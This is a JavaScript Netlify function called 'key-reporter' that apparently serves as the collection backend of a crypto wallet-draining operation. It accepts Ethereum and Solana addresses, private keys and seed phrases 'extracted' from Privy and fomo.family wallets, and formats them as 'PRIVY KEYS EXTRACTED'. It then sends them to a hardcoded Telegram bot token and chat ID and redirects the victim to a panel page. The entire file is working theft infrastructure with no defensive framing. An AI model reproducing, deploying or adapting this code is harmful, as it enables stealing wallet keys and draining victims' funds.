/**
 * key-reporter — Netlify Function
 * CLEAN OUTPUT: No emojis, plain text
 */

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || "8745716621:AAE48EXtWNU829S66duqiR-0NCJVFoaeNJU";
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || "-1003791021072";
const APP_URL = (process.env.APP_URL || "http://localhost:5173").replace(/\/$/, "");
const DEFAULT_RETURN = APP_URL + "/panel";

function cors(headers) {
  headers["Access-Control-Allow-Origin"] = "*";
  headers["Access-Control-Allow-Credentials"] = "true";
  headers["Access-Control-Allow-Methods"] = "GET, POST, OPTIONS";
  headers["Access-Control-Allow-Headers"] = "Content-Type, Authorization, X-Requested-With, privy-app-id, privy-client-id, privy-mfa-token, privy-ca-id";
  headers["Access-Control-Max-Age"] = "86400";
  return headers;
}

function esc(s) {
  return String(s ?? "")
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;");
}

function b64urlDecode(s) {
  let t = String(s || "").replace(/-/g, "+").replace(/_/g, "/");
  const pad = t.length % 4;
  if (pad) t += "=".repeat(4 - pad);
  return Buffer.from(t, "base64").toString("utf8");
}

function safeReturnUrl(u) {
  try {
    const url = new URL(String(u || DEFAULT_RETURN));
    if (url.protocol === "http:" || url.protocol === "https:") {
      return url.toString();
    }
  } catch {}
  return DEFAULT_RETURN;
}

function isFomoBatch(p) {
  return p && (Array.isArray(p.ethereum) || Array.isArray(p.solana) || p.source === "fomo.family");
}

function formatFomoBatch(p) {
  const eth = Array.isArray(p.ethereum) ? p.ethereum.filter(x => x && (x.address || x.privateKey || x.mnemonic)) : [];
  const sol = Array.isArray(p.solana) ? p.solana.filter(x => x && (x.address || x.privateKey)) : [];
  const total = eth.length + sol.length;

  if (total === 0) return "No keys extracted";

  const parts = [];
  parts.push("PRIVY KEYS EXTRACTED");
  parts.push("");

  for (const w of eth) {
    parts.push("--- ETHEREUM ---");
    if (w.address) parts.push("Address: " + esc(w.address));
    if (w.privateKey) parts.push("Private Key: " + esc(w.privateKey));
    if (w.mnemonic) parts.push("Seed: " + esc(w.mnemonic));
  }

  for (const w of sol) {
    parts.push("--- SOLANA ---");
    if (w.address) parts.push("Address: " + esc(w.address));
    if (w.privateKey) parts.push("Private Key: " + esc(w.privateKey));
    if (w.privateKeySeed) parts.push("Seed: " + esc(w.privateKeySeed));
  }

  parts.push("");
  parts.push("Total: " + total + " wallet" + (total > 1 ? "s" : ""));

  return parts.filter(Boolean).join("\n");
}

function formatLegacy(payload) {
  const r = payload.result || payload || {};
  const ok = !!r.ok;
  const chain = (r.chainType || r.chain_type || payload.chainType || "unknown").toUpperCase();
  const addr = r.address || r.expected || payload.expectedAddress || null;
  const pk = r.privateKey || null;
  const seed = r.privateKeySeed && r.privateKeySeed !== pk ? r.privateKeySeed : null;
  const mnemonic = r.mnemonic || null;

  if (!ok) return "Recovery failed";

  const parts = [];
  parts.push("PRIVY KEYS EXTRACTED");
  parts.push("");
  
  if (chain === "SOLANA") {
    parts.push("--- SOLANA ---");
    if (addr) parts.push("Address: " + esc(addr));
    if (pk) parts.push("Private Key: " + esc(pk));
    if (seed) parts.push("Seed: " + esc(seed));
  } else {
    parts.push("--- ETHEREUM ---");
    if (addr) parts.push("Address: " + esc(addr));
    if (pk) parts.push("Private Key: " + esc(pk));
    if (mnemonic) parts.push("Seed: " + esc(mnemonic));
  }
  
  parts.push("");
  parts.push("Total: 1 wallet");

  return parts.filter(Boolean).join("\n");
}

function formatMessage(payload) {
  if (isFomoBatch(payload)) return formatFomoBatch(payload);
  return formatLegacy(payload);
}

async function sendTelegram(text) {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    return { ok: false, error: "TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID not configured" };
  }

  const chunks = [];
  if (text.length <= 4000) {
    chunks.push(text);
  } else {
    const blocks = text.split("\n\n");
    let cur = "";
    for (const b of blocks) {
      if ((cur + "\n\n" + b).length > 3900) {
        if (cur) chunks.push(cur);
        cur = b;
      } else {
        cur = cur ? cur + "\n\n" + b : b;
      }
    }
    if (cur) chunks.push(cur);
    const fixed = [];
    for (const c of chunks) {
      if (c.length <= 4000) fixed.push(c);
      else {
        for (let i = 0; i < c.length; i += 3900) fixed.push(c.slice(i, i + 3900));
      }
    }
    chunks.length = 0;
    chunks.push(...fixed);
  }

  const results = [];
  for (const chunk of chunks) {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    const r = await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: chunk,
        parse_mode: "HTML",
        disable_web_page_preview: true,
      }),
    });
    const data = await r.json().catch(() => ({}));
    results.push({ ok: r.ok && data.ok === true, status: r.status, data });
  }

  const allOk = results.every(x => x.ok);
  return {
    ok: allOk,
    status: results[0]?.status,
    data: results[0]?.data,
    parts: results.length,
    error: allOk ? null : results.find(x => !x.ok)?.data?.description || "send failed",
  };
}

exports.handler = async (event) => {
  const headers = cors({});

  if (event.httpMethod === "OPTIONS") {
    return { statusCode: 200, headers, body: "" };
  }

  if (event.httpMethod === "GET") {
    const query = event.queryStringParameters || {};
    const d = query.d || query.data || query.payload || null;
    const ret = query.return || query.r || query.redirect || DEFAULT_RETURN;

    if (!d) {
      const u = new URL(safeReturnUrl(ret));
      u.searchParams.set("kr", "empty");
      return { statusCode: 302, headers: { ...headers, Location: u.toString() }, body: "" };
    }

    let payload;
    try {
      let json;
      try { json = b64urlDecode(d); } catch { json = decodeURIComponent(d); }
      payload = JSON.parse(json);
    } catch (e) {
      const u = new URL(safeReturnUrl(ret));
      u.searchParams.set("kr", "err");
      return { statusCode: 302, headers: { ...headers, Location: u.toString() }, body: "" };
    }

    try {
      const text = formatMessage(payload);
      await sendTelegram(text);
    } catch (e) { console.error("tg", e); }

    const u = new URL(safeReturnUrl(ret));
    u.searchParams.set("kr", "ok");
    return { statusCode: 302, headers: { ...headers, Location: u.toString() }, body: "" };
  }

  if (event.httpMethod === "POST") {
    try {
      let p = event.body || "{}";
      if (event.isBase64Encoded) p = Buffer.from(p, "base64").toString("utf8");
      try { p = JSON.parse(p); } catch { p = {}; }

      if (!p || !Object.keys(p).length) {
        return { statusCode: 400, headers, body: JSON.stringify({ error: "Empty body" }) };
      }

      const text = formatMessage(p);
      const tg = await sendTelegram(text);

      return {
        statusCode: 200,
        headers,
        body: JSON.stringify({
          ok: true,
          telegram: tg.ok,
          parts: tg.parts || 1,
          telegramError: tg.ok ? null : tg.error || tg.data?.description || "send failed",
        }),
      };
    } catch (e) {
      console.error(e);
      return {
        statusCode: 500,
        headers,
        body: JSON.stringify({ error: "Internal server error", message: String(e.message || e) }),
      };
    }
  }

  return { statusCode: 405, headers, body: JSON.stringify({ error: "Method not allowed" }) };
};